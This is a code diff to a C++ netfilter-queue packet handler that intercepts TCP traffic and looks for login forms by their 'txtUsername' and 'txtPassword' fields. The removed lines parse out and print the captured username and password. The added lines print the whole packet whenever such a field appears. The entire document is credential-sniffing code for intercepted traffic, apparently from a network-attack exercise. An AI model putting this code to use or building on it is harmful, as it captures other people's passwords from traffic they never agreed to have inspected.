@@ -329,26 +329,23 @@ static int nfq_packet_handler(struct nfq_q_handle *qh, struct nfgenmsg *nfmsg, s
     if (ret >= 0)
     {
         struct iphdr *ip_header = (struct iphdr *)packet;
-        struct tcphdr *tcp_header = (struct tcphdr *)(packet + ip_header->ihl * 4);
-        if (ip_header->protocol == IPPROTO_TCP && ntohs(tcp_header->dest) == 80)
+        if (ip_header->protocol == IPPROTO_TCP)
         {
-            // cout << "HTTP packet" << endl;
-            // cout << "Source IP: " << inet_ntoa(*(struct in_addr *)&ip_header->saddr) << endl;
-            // cout << "Destination IP: " << inet_ntoa(*(struct in_addr *)&ip_header->daddr) << endl;
-            // cout << "Source Port: " << ntohs(tcp_header->source) << endl;
-            // cout << "Destination Port: " << ntohs(tcp_header->dest) << endl;
-            // cout << "Payload: " << endl;
-            // cout << packet + ip_header->ihl * 4 + tcp_header->doff * 4 << endl;
-            string payload = packet + ip_header->ihl * 4 + tcp_header->doff * 4;
-            if (payload.find("txtUsername") != string::npos)
+            // use stringstream to parse the packet (size: ret)
+            stringstream ss;
+            for (int i = 0; i < ret; i++)
             {
-                cout << "Username: "<< payload.substr(payload.find("txtUsername") + 12, payload.find("&") - payload.find("txtUsername") - 12)<<endl;
-                // after & is password txtPassword=
-                cout<< "Password: "<< payload.substr(payload.find("txtPassword") + 12, payload.find("\n", payload.find("txtPassword")) - payload.find("txtPassword") - 12)<<endl;
-                nfq_set_verdict(qh, id, NF_DROP, 0, NULL);
+                ss << packet[i];
             }
-            // clear queue
-        }
+            string packet_str = ss.str();
+            // find the packet with "txtUsername"
+            if (packet_str.find("txtUsername") != string::npos)
+            {
+                cout << "HTTP POST packet with username/password found!" << endl;
+                cout << "Packet content: " << packet_str << endl;
+            }
+
+        }   
     }
     return nfq_set_verdict(qh, id, NF_ACCEPT, 0, NULL);
 }
